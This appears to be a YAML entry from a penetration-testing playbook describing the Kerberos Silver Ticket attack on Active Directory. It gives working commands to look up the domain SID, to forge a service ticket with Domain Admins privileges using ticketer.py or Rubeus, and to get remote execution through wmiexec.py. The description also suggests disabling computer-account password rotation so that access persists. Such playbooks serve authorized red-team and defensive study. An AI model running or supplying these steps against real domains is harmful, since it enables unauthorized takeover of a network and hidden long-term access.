title: Silver Ticket
category: 
  - AD:
    - Kerberos
    
tactic: Execution
tags: []

description: 
  Silver Tickets allows to access the host if it's password hash is compromised.

  Service Tickets are encrypted based on the service kerberos key. If the service account is 
  compromised it`s possible to craft arbitary tickets with any user or privileges. For services runing as a system account 
  PAC validation (for the KDC checksum) is not occurred.

  The computer accounts reset their passwords every 30 days by default and the process is initiated by the 
  computer itself. By cahgning registry key *HKEY_LOCAL_MACHINE it`s possible to disable the password update. 
  It allows to to persist access even after all other password are changed, that makes Silver Ticket attack a 
  perfect persistance technique as well.

references:
steps: 
  - description: Get the domain SID
    options: 
      - tool: impacket-lookupsid
        usage: impacket-lookupsid domain.com/user@dc.domain.com
        comments: 
      
      - tool: whoami
        usage: whoami /all
        comments: Domain SID is the User`s sid without the last part

  - description: Forge a TGS ticket (silver ticket) using the computer`s NT password hash
    options: 
      - tool: ticketer.py
        usage: 
          ticketer.py -nthash <computer_nthash> -domain-sid <domain-sid> -domain domain.com -spn cifs/server.domain.com -groups 512 tester
        comments: 
      
      - tool: Rubeus
        usage: 
          Rubeus.exe silver /service:host/server.domain.com /user:user /rc4:<NTHASH> /sid:<domain SID>
        comments: 
          
  - description: Use any kerberos-aware tool to access the server
    options: 
      - tool: wmiexec.py
        usage: KRB5CCNAME=tester.ccache wmiexec.py -k server.domain.com
        comments: 
       
comments:


  